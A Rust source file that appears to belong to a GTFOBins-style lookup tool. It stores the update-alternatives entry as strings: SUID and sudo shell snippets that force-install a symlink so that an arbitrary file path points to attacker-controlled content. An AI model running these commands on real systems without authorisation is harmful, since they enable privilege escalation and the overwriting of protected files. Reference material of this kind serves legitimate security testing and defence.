pub static BIN_NAME: &'static str = "update-alternatives";
pub static SUID_DESC: &'static str = "Write in `$LFILE` a symlink to `$TF`.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which update-alternatives) .

    LFILE=/path/to/file_to_write
    TF=$(mktemp)
    echo DATA >$TF
    ./update-alternatives --force --install "$LFILE" x "$TF" 0
"#;
pub static SUDO_DESC: &'static str = "Write in `$LFILE` a symlink to `$TF`.";
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=/path/to/file_to_write
    TF=$(mktemp)
    echo DATA >$TF
    sudo update-alternatives --force --install "$LFILE" x "$TF" 0
"#;
use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
